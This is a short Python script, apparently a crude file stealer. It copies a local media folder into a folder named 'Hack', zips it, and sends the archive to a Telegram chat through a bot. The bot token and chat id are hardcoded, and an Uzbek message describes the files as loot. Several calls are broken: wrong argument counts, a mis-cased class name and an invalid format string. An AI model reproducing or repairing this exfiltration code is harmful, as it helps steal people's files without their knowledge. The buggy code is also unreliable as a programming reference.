import os
import shutil
import telebot
import time


TELEGIRAM_BOT_TOKEN = '6503938650:AAECWBQMG4IVVqJeT1RT6sOGqG9ojickNHA'
bot = telebot.Telebot(TELEGIRAM_BOT_TOKEN)

def copy_folder(source_data, destination_folder, dirs_exist_ok):
    try:
        start_time = time.time()
        shutil.copytree(source_data, destination_folder, dirs_exist_ok=True)
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Folder copied from {source_data} to {destination_folder}, in {elapsed_time:.2f} seconds ")
        return True
    except  Exception  as e:
        print(f"error:{e}")
        return False

def create_zip(source_data, zip_filename):
    try:
        start_time = time.time()
        shutil.make_archive(zip_filename, 'zip', source_data)
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Folder  {source_data} 'zipped to' '{zip_filename}.zip' in {elapsed_time}")

    except  Exception  as e:
        print(f"error:{e}")

def send_text_to_telegram(message, chat_id):
    try:
        start_time = time.time()
        bot.send_message(chat_id, message)
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Message send to Telegiram group in {elapsed_time:.2f} seccondes")

    
    except  Exception  as e:
        print(f"error:{e}")

def send_document_to_telegram(file_path, chat_id):
    try:
        start_time = time.time()
        with open(file_path, 'rb') as file:
            bot.send_document(chat_id, file)
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Document sent to Telegiram group in {elapsed_time:2.f} seccondes")

    except Exception as e:
        print(f"Error sending document to Telegiram group  {e}")

if __name__ == '__main__':
    source_data = 'D:\media\post-image'
    destination_folder = 'D:\media\Hack'
    grup_chat_id = '285793787'
    zip_filename = 'D:\media\Hack/Hack_archve'

    if copy_folder(source_data, destination_folder):
        create_zip(destination_folder, zip_filename)
        send_document_to_telegram(f"Salom bu bizming oljadan olingan fayl")
        send_document_to_telegram(f"{zip_filename}.zip", grup_chat_id)